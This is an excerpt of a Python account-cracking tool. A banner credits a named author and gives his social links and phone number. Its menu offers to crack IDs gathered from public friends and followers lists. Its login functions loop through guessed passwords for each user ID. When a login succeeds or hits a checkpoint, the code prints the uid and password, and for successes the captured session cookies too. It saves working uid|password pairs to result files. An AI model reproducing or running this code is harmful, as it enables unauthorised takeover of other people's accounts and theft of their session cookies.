...
def logo():
	os.system("clear")
	print("""\x1b[0;32m       ╔════════════════════════════════════════════╗
\x1b[0;33m       ║        WELCOME TO A•B•D•A•L•I•I• TOOL.     ║
\x1b[0;33m       ║       #TOOL AUTHOR [MANSOOR ABDALII].      ║
\x1b[0;33m       ╚════════════════════════════════════════════╝
\x1b[0;33m        ------------I Love YOU SUMO------------
\x1b[0;33m       ╔════════════════════════════════════════════╗
\x1b[0;33m       ║#YOUTUBE : https://youtube.com/A4ABDALIM4MASTER.║
\x1b[0;33m       ║#FACEBOOK : NAME [MANSOOR ABDALII(IN URDU) II ].║
\x1b[0;33m       ║#GITHUB : https://github.com/MansoorAbdalii.║
\x1b[0;33m       ║#WHATSAPP : +923409797249.                  ║
\x1b[0;33m       ╚════════════════════════════════════════════╝""")
def login():
	os.system("clear")
	try:
...
def menu():
	...
	print("\n\033[1;90m[\033[1;94m01\033[1;92m] CRACK ID FROM PUBLIC FRIENDS")
	print("\033[1;91m[\033[1;94m02\033[1;92m] CRACK ID FROM PUBLIC FOLLOWERS")
	print("\033[1;92m[\033[1;94m03\033[1;92m] MULTIPLE-ID's CRACK\033[1;93m [ \033[1;95mPRO \033[1;97m]")
	print("\033[1;93m[\033[1;94m04\033[1;92m] Chack Crack Results")
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;99m] B-API\033[1;97m [ \033[1;95mABDALII PRO/FASTER \033[1;97m]")
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[ABDALII-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;95m[ABDALII-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
...
def mobile(user):
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;94m[ABDALII-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;95m[ABDALII-CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
